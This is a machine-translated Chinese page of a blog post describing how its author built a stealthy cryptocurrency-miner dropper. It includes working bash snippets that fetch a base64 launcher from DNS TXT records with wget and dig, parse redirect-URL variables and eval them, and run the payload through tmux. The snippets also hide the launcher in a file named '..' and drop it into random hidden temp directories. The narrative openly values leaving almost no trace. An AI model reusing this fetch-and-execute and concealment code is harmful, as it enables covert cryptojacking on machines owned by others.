<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"lang=zh><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/zh/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link href=https://www.unto.re/de/posts/chronichles_of_a_cryptonote_dropper hreflang=de rel=alternate><link href=https://www.unto.re/it/posts/chronichles_of_a_cryptonote_dropper hreflang=it rel=alternate><link href=https://www.unto.re/zh/posts/chronichles_of_a_cryptonote_dropper hreflang=zh rel=alternate><link href=https://www.unto.re/es/posts/chronichles_of_a_cryptonote_dropper hreflang=es rel=alternate><link href=https://www.unto.re/hi/posts/chronichles_of_a_cryptonote_dropper hreflang=hi rel=alternate><link href=https://www.unto.re/ar/posts/chronichles_of_a_cryptonote_dropper hreflang=ar rel=alternate><link href=https://www.unto.re/pt/posts/chronichles_of_a_cryptonote_dropper hreflang=pt rel=alternate><link href=https://www.unto.re/bn/posts/chronichles_of_a_cryptonote_dropper hreflang=bn rel=alternate><link href=https://www.unto.re/ru/posts/chronichles_of_a_cryptonote_dropper hreflang=ru rel=alternate><link href=https://www.unto.re/ja/posts/chronichles_of_a_cryptonote_dropper hreflang=ja rel=alternate><link href=https://www.unto.re/pa/posts/chronichles_of_a_cryptonote_dropper hreflang=pa rel=alternate><link href=https://www.unto.re/jw/posts/chronichles_of_a_cryptonote_dropper hreflang=jw rel=alternate><link href=https://www.unto.re/vi/posts/chronichles_of_a_cryptonote_dropper hreflang=vi rel=alternate><link href=https://www.unto.re/fr/posts/chronichles_of_a_cryptonote_dropper hreflang=fr rel=alternate><link href=https://www.unto.re/ur/posts/chronichles_of_a_cryptonote_dropper hreflang=ur rel=alternate><link href=https://www.unto.re/tr/posts/chronichles_of_a_cryptonote_dropper hreflang=tr rel=alternate><link href=https://www.unto.re/pl/posts/chronichles_of_a_cryptonote_dropper hreflang=pl rel=alternate><link href=https://www.unto.re/uk/posts/chronichles_of_a_cryptonote_dropper hreflang=uk rel=alternate><link href=https://www.unto.re/nl/posts/chronichles_of_a_cryptonote_dropper hreflang=nl rel=alternate><link href=https://www.unto.re/el/posts/chronichles_of_a_cryptonote_dropper hreflang=el rel=alternate><link href=https://www.unto.re/sv/posts/chronichles_of_a_cryptonote_dropper hreflang=sv rel=alternate><link href=https://www.unto.re/zu/posts/chronichles_of_a_cryptonote_dropper hreflang=zu rel=alternate><link href=https://www.unto.re/ro/posts/chronichles_of_a_cryptonote_dropper hreflang=ro rel=alternate><link href=https://www.unto.re/ms/posts/chronichles_of_a_cryptonote_dropper hreflang=ms rel=alternate><link href=https://www.unto.re/ko/posts/chronichles_of_a_cryptonote_dropper hreflang=ko rel=alternate><link href=https://www.unto.re/th/posts/chronichles_of_a_cryptonote_dropper hreflang=th rel=alternate><link href=https://www.unto.re/tl/posts/chronichles_of_a_cryptonote_dropper hreflang=tl rel=alternate><link title="untoreh 的网站"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/zh/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="Chronicles of a cryptonote dropper"property=og:title><meta content=article property=og:type><meta content=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper property=og:url><meta content=https://www.unto.re/assets/appa.png property=og:image><meta content="...How far are you willing to go for...pennies?"property=og:description><meta content="untoreh's site"property=og:site_name><meta content=en_US property=og:locale><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2022,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><link href=/css/franklin.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/menu.css rel=stylesheet><link href=/css/pages.css rel=stylesheet><link href=/css/lunr.css rel=stylesheet><link href=/css/footer.css rel=stylesheet><link href=/css/responsive.css rel=stylesheet><link href=/css/animations.css rel=stylesheet><link href=/css/docco.css rel=stylesheet><link href=/css/flags-sprite.css rel=stylesheet><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> 加密货币滴管的编年史</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/zh/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/zh/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2022-03-05T20:57:13.534","inLanguage":"zh","name":"","mainEntityOfPage":{"@id":"/zh/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/zh/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=" untoreh-light"class=flip-front src=/assets/appa.png><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button class=search-button formaction=/search/index.html title=搜索网站 value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/zh/posts/><i class="fas fa-pen menu-icons"></i> 帖子</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/zh/media/><i class="fas fa-tv menu-icons"></i> 媒体</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham type=button><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button class=search-button formaction=/search/index.html title=搜索网站 value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/zh/posts/><i class="fas fa-pen menu-icons"></i> 帖子</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/zh/media/><i class="fas fa-tv menu-icons"></i> 媒体</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/zh/posts/chronichles_of_a_cryptonote_dropper> 加密货币滴管的编年史</a></h1><blockquote id=page-description style=font-style:italic>......你愿意花多远......一分钱？</blockquote></div><div class=franklin-content><p>假设你想挖矿<a href=https://en.wikipedia.org/wiki/Cryptocurrency> 加密货币</a> 在远程<em> 虚拟的</em> 硬件。你需要找到我的东西。远程服务器意味着，没有<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> 亚瑟士</a> 或 GPU 工作证明算法，基本上只有<a href=\posts/a-few-notes-on-proof-of-work> CPU友好的硬币</a>.<h2 id=the_software><a class=header-anchor href=#the_software> 软件</a></h2><p>搜索并找到一个<a href=https://github.com/xmrig/xmrig> 矿工</a> ，但它并不是很好，你想要一些你可以从远程更好地控制的东西，所以你发现<a href=https://github.com/Bendr0id/xmrigCC> 另一个矿工</a> .你还想要一个<a href=https://github.com/Bendr0id/xmrigcc-proxy> 代理</a> ，因为很多连接都是短暂的，你不想<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> 做</a> 你的矿池。也<a href=https://github.com/search?q=tunnel> 隧道</a> 会好的。<h2 id=the_design><a class=header-anchor href=#the_design> 该设计</a></h2><p>一些僵尸网络使用区块链数据来查找命令，<a href=https://twitter.com/sarahjamielewis> 某人</a> 似乎也有<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> 输掉的赌注</a> 这不会再发生了......无论如何我们不是那么复杂，我们将通过一些DNS记录来存储一个脚本，该脚本将自提取的有效负载提取到临时目录中执行并离开<em> 几乎</em> 没有任何设置的痕迹。这是一个描述结构的小流程图</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher> 启动器</a></h2><p>启动脚本的重点是易于访问和易于更新，以经受住时间的考验。更新中<a href=https://en.wikipedia.org/wiki/Domain_Name_System> 域名系统</a>记录很容易，而且 DNS 是网络中最后一个关闭的东西……因为 IP 地址很难记住……所以它可能在大多数时候都可用。你看我们什么时候<em> 获取部署脚本</em> 我们实际上已经在运行一些逻辑，这是启动程序脚本，它需要能够执行 DNS 查询来查找我们的记录，DNS 可能无处不在，但是<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> 挖</a> 不是。<p>这里有一个难题，如果我们必须下载另一个工具<em> 下载另一个脚本以下载有效负载</em> 我们应该只下载有效载荷！在防御中......做这种脚本式的舞蹈增加了混淆，允许只保留启动器的一个实现（可维护性，是的），大多数时候不需要......所以我们还提供服务<a href=https://en.wikipedia.org/wiki/Standalone_program> 静态链接</a> dig 可执行文件来执行 dns 查询，通过自托管或云托管获取（是的，有后备，如 3 或 4，因为云服务的免费带宽非常小，还需要 cookie 或访问令牌......它们非常脚本不友好，当然是故意的）。<p>dns 记录中有什么？我们正在使用<a href=https://en.wikipedia.org/wiki/TXT_record> 文本</a> 记录，在自定义域上（这里也有后备）。为什么是TXT？它们恰好是可以存储最大量数据的那些......通常是因为它有点<a href=https://www.ietf.org/rfc/rfc6763.txt> 受到推崇的</a> 根据<em> 事物</em> .我们专门使用<a href=https://www.cloudflare.com/> 云耀斑</a> 用于我们的 DNS 摆弄，因为它是免费的，而且几乎是镇上唯一的玩家（<em> 不是真的，但任何其他替代品都是明智的</em> ）。碰巧您可以将多条数据存储在<em> 相同的</em>记录......这开始变得混乱并争夺某些规范......（切线）Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> 曾经</a> 允许<em> 链式</em> TXT 记录总计约 9k 字节，文档现在声明约 2k 字节，在更改之前我使用的是约 6k 字节，并且提供未压缩的脚本，之后我必须精简脚本并事先压缩它（实际上我尝试使用<a href=https://freedns.afraid.org/> 自由</a> 提供者，我在一天之内被禁止，我猜他们有严格的无脂肪 TXT 记录政策），但是 gzip 压缩似乎对管道不友好并且仍然导致问题，所以我不得不设法在没有压缩的情况下塞入脚本（端切线）。<p>我们如何存储它？ TXT 记录仅支持字母数字字符串，不支持<a href=https://en.wikipedia.org/wiki/Null_character> 空头</a> ，所以我们必须把它包装成一个非空编码，<a href=https://en.wikipedia.org/wiki/Base64> base64</a> 满足这个约束，因为我们正在存储<em> 链式</em> TXT 记录，我们必须对输出进行分块，因为我们使用的是 shell，这是通过<code>-w</code> 标志，在busybox上，旧版本上没有（或选择加入）这样的标志，这很烦人，另一种方法是使用与openssl捆绑在一起的编码器，<code>openssl enc -base64</code>.<p>现在我们知道如何存储我们的部署脚本，我们将它存储在<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> 参考 cli</a> 或手动。我们如何拉它？我们提到我们需要 bindutils 或我们自己的<code>dig</code> ...选择服务端点后，我们要下载它，可用的通常是<a href=https://www.gnu.org/software/wget/> 获取</a> 或者<a href=https://curl.se/> 卷曲</a> , wget 更经常被发现预安装，但是 busybox 只提供动态库的 tls 支持，所以你必须确保端点正在服务 http 或者你的实用程序是<code>wget</code> 来自 gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>意思是尝试<code>-t2</code>等待的次数<code>-T10</code> 秒是<code>-q</code> 安静的阅读<code>-i-</code> 标准输入 (<code>$digurl</code> ) 并写信给<code>-O-</code> 标准输出（<code>$filename</code> ）。乍一看，此命令不会显示我们正在下载的内容。出于同样的原因，我们将非常小心地使用其他 shell 命令，或者坚持使用 shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> 猛击</a> ) 在可能的情况下内置插件。还要注意下载可执行文件的位置，要确保可以执行它们，因为某些挂载点，尤其是在容器和<code>tmp</code> 路径是<code>noexec</code> .现在我们有了我们的 dns 查询工具，我们可以获取我们的记录<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>标志在这里是不言自明的，<code>+short</code> 只是意味着我们只对数据本身感兴趣，所以我们不必解析输出。指定 DNS 服务器很重要，例如 google (<code>8.8.8.8</code> ) 或 cloudflare (<code>1.1.1.1</code> ) 因为许多环境默认将 dns 查询重定向或代理到他们自己的 dns 服务器。在获取分块脚本后，我们处理引号和空格以使其准备好进行解码<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>如果现在我们<em> 仍然</em> 没有我们的启动器？ DNS 很乱，我们想要一个回退，让我们设置一个子域来直接获取启动程序脚本。在评估我们的脚本之前，我们希望使用一些变量对其进行自定义，再次让我们使用 TXT 记录来存储 NAME=VALUE 变量列表并对其进行解析。还有一个变量的回退，cloudflare 提供基于 URL 的重定向，这些重定向被提供<em> 前</em>目的地，所以我们不需要端点，我们只想配置基于正则表达式的重定向规则到一个虚构的端点，我们感兴趣的是 url 的参数<code>?NAME=VALUE&NAME2=VALUE2...</code> ，这样我们就可以简单地通过更改重定向 url 来参数化我们的启动器，始终注意引用和转义代码<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>wget<code>-S</code> 打印我们感兴趣的重定向 url 以进行解析。有了参数和脚本，我们评估将它们写入文件的变量<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>该文件将来自 are deploy 脚本。启动脚本的最后一部分是实际<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> 蹦床</a> ，评估当前 shell 进程中的脚本，或者如果可能的话，让它由 tmux 管理。<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>启动程序脚本被转储到一个名为“..”的文件中，这看起来很混乱，因为它可能被误认为是<em> 父母</em> 目录。并且我们不包括 session 命令，因为它会留在 process 命令中，而是我们预先启动 tmux 会话并通过 tmux 终端接口发送源命令。与此相关，有时调用可执行文件<code>./</code> 将这些字符保留在命令中，因此最好添加<code>$PWD</code> 到路径..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> 有效载荷</a></h2><p>我们的部署脚本从采购<code>env.sh</code> 文件，并将变量保持或配置为<code>STARTING_*</code> vars 喜欢<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>这允许我们在重置环境时杀死并重新启动正在运行的实例。让我们切换到具有 exec 功能的 tmp 目录<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>检查是否在一个<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> 容器</a> 也很方便，我们可以探测文件系统以获取提示<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
